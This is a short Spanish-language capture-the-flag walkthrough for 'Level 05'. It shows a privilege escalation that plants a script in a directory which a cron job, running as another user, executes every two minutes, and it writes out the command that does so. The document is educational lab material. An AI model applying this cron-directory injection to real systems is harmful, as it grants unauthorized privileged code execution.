<h1 align="center">Level 05 Walkthrough ~ Crontab Code Injection</h1>

Al llegar a este nivel veo que aparece un mensaje que dice "You have new mail.", normalmente en
Linux los mails se almacenan en `/var/mail` y una vez me dirijo a ese directorio me encuentro 
con un fichero con el reporte de una tarea cron tal que:
```bash
*/2 * * * * su -c /usr/sbin/openarenaserver" - flag05
```
> Se ejecuta cada 2 minutos bajo el nombre de flag05.

El fichero `openarenaserver` contiene:

```bash
  $> cat /usr/sbin/openarenaserver

  #!/bin/sh

  for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
  done
```
> Este script trata de ejecutar todos los ficheros dentro del directorio `/opt/openarenaserver`
> con un límite de 5 segundos y después los borra.

Así que preparo como he hecho ya anteriormente en otros niveles el comando getflag en esa ubicación:

```bash
echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag
```

Espero un poco, leo `/tmp/flag` y paso al [siguiente nivel](../../level06/resources/README.md).
